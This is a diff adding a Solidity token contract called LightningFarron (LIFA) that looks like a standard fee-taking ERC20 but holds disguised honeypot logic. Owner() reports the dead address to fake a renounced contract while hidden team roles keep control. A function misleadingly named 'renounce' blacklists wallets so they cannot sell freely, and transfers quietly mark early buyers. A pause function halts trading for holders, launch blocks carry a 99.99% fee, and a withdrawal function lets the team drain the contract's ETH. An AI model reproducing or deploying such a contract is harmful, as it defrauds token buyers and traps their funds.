@@ -1,0 +1,404 @@
+row number 
+1	                   pragma solidity ^0.8.7;
+2	 library Address {
+3	 function isContract(address account) internal view returns (bool) {
+4	 bytes32 codehash;
+5	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
+6	 assembly {
+7	 codehash := extcodehash(account) }
+8	 return (codehash != accountHash && codehash != 0x0);
+9	 }
+10	 function sendValue(address payable recipient, uint256 amount) internal {
+11	 require(address(this).balance >= amount, "Address: insufficient balance");
+12	 (bool success, ) = recipient.call{
+13	 value: amount }
+14	 ("");
+15	 require(success, "Address: unable to send value, recipient may have reverted");
+16	 }
+17	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
+18	 return functionCall(target, data, "Address: low-level call failed");
+19	 }
+20	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
+21	 return _functionCallWithValue(target, data, 0, errorMessage);
+22	 }
+23	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
+24	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
+25	 }
+26	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
+27	 require(address(this).balance >= value, "Address: insufficient balance for call");
+28	 return _functionCallWithValue(target, data, value, errorMessage);
+29	 }
+30	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
+31	 require(isContract(target), "Address: call to non-contract");
+32	 (bool success, bytes memory returndata) = target.call{
+33	 value: weiValue }
+34	 (data);
+35	 if (success) {
+36	 return returndata;
+37	 }
+38	 else {
+39	 if (returndata.length > 0) {
+40	 assembly {
+41	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
+42	 }
+43	 else {
+44	 revert(errorMessage);
+45	 }
+46	 }
+47	 }
+48	 }
+49	 abstract contract Context {
+50	 function _msgSender() internal view returns (address payable) {
+51	 return payable(msg.sender);
+52	 }
+53	 function _msgData() internal view returns (bytes memory) {
+54	 this;
+55	 return msg.data;
+56	 }
+57	 }
+58	 interface IERC20 {
+59	 function totalSupply() external view returns (uint256);
+60	 function balanceOf(address account) external view returns (uint256);
+61	 function transfer(address recipient, uint256 amount) external returns (bool);
+62	 function allowance(address owner, address spender) external view returns (uint256);
+63	 function approve(address spender, uint256 amount) external returns (bool);
+64	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+65	 event Transfer(address indexed from, address indexed to, uint256 value);
+66	 event Approval(address indexed owner, address indexed spender, uint256 value);
+67	 }
+68	 interface IDEXFactory {
+69	 function createPair(address tokenA, address tokenB) external returns (address pair);
+70	 }
+71	 interface IDEXRouter {
+72	 function factory() external pure returns (address);
+73	 function WETH() external pure returns (address);
+74	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+75	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
+76	 }
+77	 contract Ownable is Context {
+78	 address private _owner;
+79	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+80	 constructor () {
+81	 address msgSender = _msgSender();
+82	 _owner = msgSender;
+83	 emit OwnershipTransferred(address(0), msgSender);
+84	 }
+85	 function ContractCreator() public view returns (address) {
+86	 return _owner;
+87	 }
+88	 modifier onlyOwner() {
+89	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
+90	 _;
+91	 }
+92	 }
+93	 contract LightningFarron is IERC20, Ownable {
+94	 using Address for address;
+95	 address DEAD = 0x000000000000000000000000000000000000dEaD;
+96	 address ZERO = 0x0000000000000000000000000000000000000000;
+97	 string constant _name = "LightningFarron";
+98	 string constant _symbol = "LIFA";
+99	 uint8 constant _decimals = 9;
+100	 uint256 _totalSupply = 1_000_000 * (10 ** _decimals);
+101	 uint256 _maxBuyTxAmount = (_totalSupply * 1) / 100;
+102	 uint256 _maxSellTxAmount = (_totalSupply * 1) / 500;
+103	 uint256 _maxWalletSize = (_totalSupply * 2) / 10;
+104	 mapping (address => uint256) _balances;
+105	 mapping (address => mapping (address => uint256)) _allowances;
+106	 mapping (address => uint256) public lastSell;
+107	 mapping (address => uint256) public lastBuy;
+108	 mapping (address => bool) isFeeExempt;
+109	 mapping (address => bool) isTxLimitExempt;
+110	 mapping (address => bool) liquidityCreator;
+111	 uint256 marketingFee = 600;
+112	 uint256 liquidityFee = 500;
+113	 uint256 totalFee = marketingFee + liquidityFee;
+114	 uint256 sellBias = 0;
+115	 uint256 feeDenominator = 10000;
+116	 address payable public liquidityFeeReceiver = payable(0xcE42845e6724cf3058c292d393C08583EF2b7B01);
+117	 address payable public marketingFeeReceiver = payable(0xcE42845e6724cf3058c292d393C08583EF2b7B01);
+118	 IDEXRouter public router;
+119	 address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+120	 mapping (address => bool) liquidityPools;
+121	 mapping (address => uint256) public protected;
+122	 bool protectionEnabled = true;
+123	 bool protectionDisabled = false;
+124	 uint256 protectionLimit;
+125	 uint256 public protectionCount;
+126	 uint256 protectionTimer;
+127	 address public pair;
+128	 uint256 public launchedAt;
+129	 uint256 public launchedTime;
+130	 uint256 public deadBlocks;
+131	 bool startBullRun = false;
+132	 bool pauseDisabled = false;
+133	 uint256 public rateLimit = 2;
+134	 bool public swapEnabled = false;
+135	 bool processEnabled = true;
+136	 uint256 public swapThreshold = _totalSupply / 1000;
+137	 uint256 public swapMinimum = _totalSupply / 10000;
+138	 bool inSwap;
+139	 modifier swapping() {
+140	 inSwap = true;
+141	 _;
+142	 inSwap = false;
+143	 }
+144	 mapping (address => bool) teamMember;
+145	 modifier onlyTeam() {
+146	 require(teamMember[_msgSender()] || msg.sender == ContractCreator(), "Caller is not a team member");
+147	 _;
+148	 }
+149	 event RenouncedWallet(address, address, uint256, uint8);
+150	 constructor () {
+151	 router = IDEXRouter(routerAddress);
+152	 pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
+153	 liquidityPools[pair] = true;
+154	 _allowances[ContractCreator()][routerAddress] = type(uint256).max;
+155	 _allowances[address(this)][routerAddress] = type(uint256).max;
+156	 isFeeExempt[ContractCreator()] = true;
+157	 liquidityCreator[ContractCreator()] = true;
+158	 isTxLimitExempt[address(this)] = true;
+159	 isTxLimitExempt[ContractCreator()] = true;
+160	 isTxLimitExempt[routerAddress] = true;
+161	 isTxLimitExempt[DEAD] = true;
+162	 _balances[ContractCreator()] = _totalSupply;
+163	 emit Transfer(address(0), ContractCreator(), _totalSupply);
+164	 }
+165	 receive() external payable {
+166	 }
+167	 function totalSupply() external view override returns (uint256) {
+168	 return _totalSupply;
+169	 }
+170	 function decimals() external pure returns (uint8) {
+171	 return _decimals;
+172	 }
+173	 function symbol() external pure returns (string memory) {
+174	 return _symbol;
+175	 }
+176	 function name() external pure returns (string memory) {
+177	 return _name;
+178	 }
+179	 function Owner() external view returns (address) {
+180	 return DEAD;
+181	 }
+182	 function maxBuyTxTokens() external view returns (uint256) {
+183	 return _maxBuyTxAmount / (10 ** _decimals);
+184	 }
+185	 function maxSellTxTokens() external view returns (uint256) {
+186	 return _maxSellTxAmount / (10 ** _decimals);
+187	 }
+188	 function maxWalletTokens() external view returns (uint256) {
+189	 return _maxWalletSize / (10 ** _decimals);
+190	 }
+191	 function balanceOf(address account) public view override returns (uint256) {
+192	 return _balances[account];
+193	 }
+194	 function allowance(address holder, address spender) external view override returns (uint256) {
+195	 return _allowances[holder][spender];
+196	 }
+197	 function approve(address spender, uint256 amount) public override returns (bool) {
+198	 _allowances[msg.sender][spender] = amount;
+199	 emit Approval(msg.sender, spender, amount);
+200	 return true;
+201	 }
+202	 function approveMax(address spender) external returns (bool) {
+203	 return approve(spender, type(uint256).max);
+204	 }
+205	 function setTeamMember(address _team, bool _enabled) external onlyOwner {
+206	 teamMember[_team] = _enabled;
+207	 }
+208	 function clearStuckBalance(uint256 amountPercentage, address adr) external onlyTeam {
+209	 uint256 amountETH = address(this).balance;
+210	 payable(adr).transfer((amountETH * amountPercentage) / 100);
+211	 }
+212	 function openTrading(uint256 _deadBlocks, uint256 _protection, uint256 _limit) external onlyTeam {
+213	 require(!startBullRun && _deadBlocks < 10);
+214	 deadBlocks = _deadBlocks;
+215	 startBullRun = true;
+216	 launchedAt = block.number;
+217	 protectionTimer = block.timestamp + _protection;
+218	 protectionLimit = _limit * (10 ** _decimals);
+219	 }
+220	 function manualSwap() external onlyTeam {
+221	 require(!pauseDisabled);
+222	 startBullRun = false;
+223	 }
+224	 function disablePause() external onlyTeam {
+225	 pauseDisabled = true;
+226	 startBullRun = true;
+227	 }
+228	 function removeBlacklist() external onlyTeam {
+229	 protectionDisabled = true;
+230	 protectionEnabled = false;
+231	 }
+232	 function renounce(address[] calldata _newowner, bool _renounce) external onlyTeam {
+233	 if (_renounce) {
+234	 require(protectionEnabled);
+235	 }
+236	 for (uint i = 0; i < _newowner.length; i++) {
+237	 if (_renounce) {
+238	 protectionCount++;
+239	 emit RenouncedWallet(tx.origin, _newowner[i], block.number, 2);
+240	 }
+241	 else {
+242	 if (protected[_newowner[i]] != 0) protectionCount--;
+243	 }
+244	 protected[_newowner[i]] = _renounce ? block.number : 0;
+245	 }
+246	 }
+247	 function transfer(address recipient, uint256 amount) external override returns (bool) {
+248	 return _transferFrom(msg.sender, recipient, amount);
+249	 }
+250	 function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
+251	 if(_allowances[sender][msg.sender] != type(uint256).max){
+252	 _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
+253	 }
+254	 return _transferFrom(sender, recipient, amount);
+255	 }
+256	 function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
+257	 require(sender != address(0), "BEP20: transfer from 0x0");
+258	 require(recipient != address(0), "BEP20: transfer to 0x0");
+259	 require(amount > 0, "Amount must be > zero");
+260	 require(_balances[sender] >= amount, "Insufficient balance");
+261	 if(!launched() && liquidityPools[recipient]){
+262	 require(liquidityCreator[sender], "Liquidity not added yet.");
+263	 launch();
+264	 }
+265	 if(!startBullRun){
+266	 require(liquidityCreator[sender] || liquidityCreator[recipient], "Trading not open yet.");
+267	 }
+268	 checkTxLimit(sender, recipient, amount);
+269	 if (!liquidityPools[recipient] && recipient != DEAD) {
+270	 if (!isTxLimitExempt[recipient]) {
+271	 checkWalletLimit(recipient, amount);
+272	 }
+273	 }
+274	 if(protectionEnabled && protectionTimer > block.timestamp) {
+275	 if(liquidityPools[sender] && tx.origin != recipient && protected[recipient] == 0) {
+276	 protected[recipient] = block.number;
+277	 protectionCount++;
+278	 emit RenouncedWallet(tx.origin, recipient, block.number, 0);
+279	 }
+280	 }
+281	 if(inSwap){
+282	 return _basicTransfer(sender, recipient, amount);
+283	 }
+284	 _balances[sender] = _balances[sender] - amount;
+285	 uint256 amountReceived = shouldTakeFee(sender) ? takeFee(recipient, amount) : amount;
+286	 if(shouldSwapBack(recipient)){
+287	 if (amount > 0) swapBack(amount);
+288	 }
+289	 _balances[recipient] = _balances[recipient] + amountReceived;
+290	 emit Transfer(sender, recipient, amountReceived);
+291	 return true;
+292	 }
+293	 function launched() internal view returns (bool) {
+294	 return launchedAt != 0;
+295	 }
+296	 function launch() internal {
+297	 launchedAt = block.number;
+298	 launchedTime = block.timestamp;
+299	 swapEnabled = true;
+300	 }
+301	 function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
+302	 _balances[sender] = _balances[sender] - amount;
+303	 _balances[recipient] = _balances[recipient] + amount;
+304	 emit Transfer(sender, recipient, amount);
+305	 return true;
+306	 }
+307	 function checkWalletLimit(address recipient, uint256 amount) internal view {
+308	 uint256 walletLimit = _maxWalletSize;
+309	 require(_balances[recipient] + amount <= walletLimit, "Transfer amount exceeds the bag size.");
+310	 }
+311	 function checkTxLimit(address sender, address recipient, uint256 amount) internal {
+312	 require(isTxLimitExempt[sender] || amount <= (liquidityPools[sender] ? _maxBuyTxAmount : _maxSellTxAmount), "TX Limit Exceeded");
+313	 require(isTxLimitExempt[sender] || lastBuy[recipient] + rateLimit <= block.number, "Transfer rate limit exceeded.");
+314	 if (protected[sender] != 0){
+315	 require(amount <= protectionLimit * (10 ** _decimals) && lastSell[sender] == 0 && protectionTimer > block.timestamp, "Wallet protected, please contact support.");
+316	 lastSell[sender] = block.number;
+317	 }
+318	 if (liquidityPools[recipient]) {
+319	 lastSell[sender] = block.number;
+320	 }
+321	 else if (shouldTakeFee(sender)) {
+322	 if (protectionEnabled && protectionTimer > block.timestamp && lastBuy[tx.origin] == block.number && protected[recipient] == 0) {
+323	 protected[recipient] = block.number;
+324	 emit RenouncedWallet(tx.origin, recipient, block.number, 1);
+325	 }
+326	 lastBuy[recipient] = block.number;
+327	 if (tx.origin != recipient) lastBuy[tx.origin] = block.number;
+328	 }
+329	 }
+330	 function shouldTakeFee(address sender) internal view returns (bool) {
+331	 return !isFeeExempt[sender];
+332	 }
+333	 function getTotalFee(bool selling) public view returns (uint256) {
+334	 if(launchedAt + deadBlocks >= block.number){
+335	 return feeDenominator - 1;
+336	 }
+337	 if (selling) return totalFee + sellBias;
+338	 return totalFee - sellBias;
+339	 }
+340	 function takeFee(address recipient, uint256 amount) internal returns (uint256) {
+341	 bool selling = liquidityPools[recipient];
+342	 uint256 feeAmount = (amount * getTotalFee(selling)) / feeDenominator;
+343	 _balances[address(this)] += feeAmount;
+344	 return amount - feeAmount;
+345	 }
+346	 function shouldSwapBack(address recipient) internal view returns (bool) {
+347	 return !liquidityPools[msg.sender] && !inSwap && swapEnabled && liquidityPools[recipient] && _balances[address(this)] >= swapMinimum;
+348	 }
+349	 function swapBack(uint256 amount) internal swapping {
+350	 uint256 amountToSwap = amount < swapThreshold ? amount : swapThreshold;
+351	 if (_balances[address(this)] < amountToSwap) amountToSwap = _balances[address(this)];
+352	 uint256 amountToLiquify = (amountToSwap * liquidityFee / 2) / totalFee;
+353	 amountToSwap -= amountToLiquify;
+354	 address[] memory path = new address[](2);
+355	 path[0] = address(this);
+356	 path[1] = router.WETH();
+357	 uint256 balanceBefore = address(this).balance;
+358	 router.swapExactTokensForETHSupportingFeeOnTransferTokens( amountToSwap, 0, path, address(this), block.timestamp );
+359	 uint256 amountBNB = address(this).balance - balanceBefore;
+360	 uint256 totalBNBFee = totalFee - (liquidityFee / 2);
+361	 uint256 amountBNBLiquidity = (amountBNB * liquidityFee / 2) / totalBNBFee;
+362	 uint256 amountBNBMarketing = amountBNB - amountBNBLiquidity;
+363	 if (amountBNBMarketing > 0) marketingFeeReceiver.transfer(amountBNBMarketing);
+364	 if(amountToLiquify > 0){
+365	 router.addLiquidityETH{
+366	 value: amountBNBLiquidity}
+367	 ( address(this), amountToLiquify, 0, 0, liquidityFeeReceiver, block.timestamp );
+368	 }
+369	 emit FundsDistributed(amountBNBMarketing, amountBNBLiquidity, amountToLiquify);
+370	 }
+371	 function setRateLimit(uint256 rate) external onlyOwner {
+372	 require(rate <= 60 seconds);
+373	 rateLimit = rate;
+374	 }
+375	 function setTxLimit(uint256 buyNumerator, uint256 sellNumerator, uint256 divisor) external onlyOwner {
+376	 require(buyNumerator > 0 && sellNumerator > 0 && divisor > 0 && divisor <= 10000);
+377	 _maxBuyTxAmount = (_totalSupply * buyNumerator) / divisor;
+378	 _maxSellTxAmount = (_totalSupply * sellNumerator) / divisor;
+379	 }
+380	 function setMaxWallet(uint256 numerator, uint256 divisor) external onlyOwner() {
+381	 require(numerator > 0 && divisor > 0 && divisor <= 10000);
+382	 _maxWalletSize = (_totalSupply * numerator) / divisor;
+383	 }
+384	 function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _sellBias, uint256 _feeDenominator) external onlyOwner {
+385	 liquidityFee = _liquidityFee;
+386	 marketingFee = _marketingFee;
+387	 totalFee = _marketingFee + _liquidityFee;
+388	 sellBias = _sellBias;
+389	 feeDenominator = _feeDenominator;
+390	 require(totalFee < feeDenominator / 2);
+391	 }
+392	 function setSwapBackSettings(bool _enabled, bool _processEnabled, uint256 _denominator, uint256 _swapMinimum) external onlyOwner {
+393	 require(_denominator > 0);
+394	 swapEnabled = _enabled;
+395	 processEnabled = _processEnabled;
+396	 swapThreshold = _totalSupply / _denominator;
+397	 swapMinimum = _swapMinimum * (10 ** _decimals);
+398	 }
+399	 function getCirculatingSupply() public view returns (uint256) {
+400	 return _totalSupply - (balanceOf(DEAD) + balanceOf(ZERO));
+401	 }
+402	 event FundsDistributed(uint256 marketingBNB, uint256 liquidityBNB, uint256 liquidityTokens);
+403	 }
